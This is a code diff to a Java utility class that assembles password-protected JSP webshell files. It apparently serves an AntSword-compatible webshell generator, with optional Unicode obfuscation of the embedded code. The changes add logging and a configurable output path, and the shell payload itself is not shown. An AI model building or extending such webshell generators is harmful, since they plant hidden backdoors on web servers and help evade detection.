@@ -1,25 +1,30 @@
 package org.sec.util;
 
 import com.github.javaparser.ast.body.MethodDeclaration;
+import org.apache.log4j.Logger;
 
 @SuppressWarnings("all")
 public class WriteUtil {
-    public static void writeAnt(String antClassCode, String antCode, String antDecCode, String decCode) {
+    private static final Logger logger = Logger.getLogger(WriteUtil.class);
+
+    public static void writeAnt(String antClassCode, String antCode,
+                                String antDecCode, String decCode, String output) {
         try {
+            logger.info("write ant sword jsp file");
             String prefix = "<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>";
             StringBuilder sb = new StringBuilder();
             sb.append("<%!").append(antClassCode).append("%>")
                     .append("<%!").append(antDecCode).append("%>")
                     .append("<%!").append(decCode).append("%>")
                     .append("<%").append(antCode).append("%>");
-            FileUtil.writeFile("result.jsp", compactCode(sb.toString()));
+            FileUtil.writeFile(output, compactCode(sb.toString()));
         } catch (Exception e) {
-            e.printStackTrace();
+            logger.error(e.getMessage());
         }
     }
 
     public static void writeJavac(MethodDeclaration method, MethodDeclaration decMethod,
-                                  String password, boolean useUnicode) {
+                                  String password, boolean useUnicode, String outputFile) {
         String prefix = "<%@ page import=\"java.net.URL\" %>\n" +
                 "<%@ page import=\"java.net.URLClassLoader\" %>\n" +
                 "<%@ page import=\"java.nio.charset.Charset\" %>\n" +
@@ -34,6 +39,7 @@ public class WriteUtil {
                 "<%@ page import=\"java.util.Random\" %>\n" +
                 "<%@ page import=\"java.io.File\" %>";
         try {
+            logger.info("write javac jsp file");
             String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
             String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
             String decCode = decMethod.toString();
@@ -42,23 +48,25 @@ public class WriteUtil {
                 String newCode = compactCode(source);
                 String newDecCode = compactCode(decCode);
                 if (useUnicode) {
+                    logger.info("use unicode encode");
                     newCode = UnicodeUtil.encodeString(newCode);
                     newDecCode = UnicodeUtil.encodeString(newDecCode);
                     String output = prefix + passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
-                    FileUtil.writeFile("result.jsp", output);
+                    FileUtil.writeFile(outputFile, output);
                 } else {
                     String output = prefix + passwordCode + "<%!" + decCode + "%><%" + source + " %>";
-                    FileUtil.writeFile("result.jsp", output);
+                    FileUtil.writeFile(outputFile, output);
                 }
             }
         } catch (Exception e) {
-            e.printStackTrace();
+            logger.error(e.getMessage());
         }
     }
 
     public static void write(MethodDeclaration method, MethodDeclaration decMethod,
-                             String password, boolean useUnicode) {
+                             String password, boolean useUnicode, String outputFile) {
         try {
+            logger.info("write jsp file");
             String prefix = "<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>";
             String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
             String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
@@ -67,19 +75,19 @@ public class WriteUtil {
                 String source = code.substring(1, code.length() - 2);
                 String newCode = compactCode(source);
                 String newDecCode = compactCode(decCode);
-
                 if (useUnicode) {
+                    logger.info("use unicode encode");
                     newCode = UnicodeUtil.encodeString(newCode);
                     newDecCode = UnicodeUtil.encodeString(newDecCode);
                     String output = prefix + passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
-                    FileUtil.writeFile("result.jsp", output);
+                    FileUtil.writeFile(outputFile, output);
                 } else {
                     String output = prefix + passwordCode + "<%!" + decCode + "%><%" + source + " %>";
-                    FileUtil.writeFile("result.jsp", output);
+                    FileUtil.writeFile(outputFile, output);
                 }
             }
         } catch (Exception e) {
-            e.printStackTrace();
+            logger.error(e.getMessage());
         }
     }
 
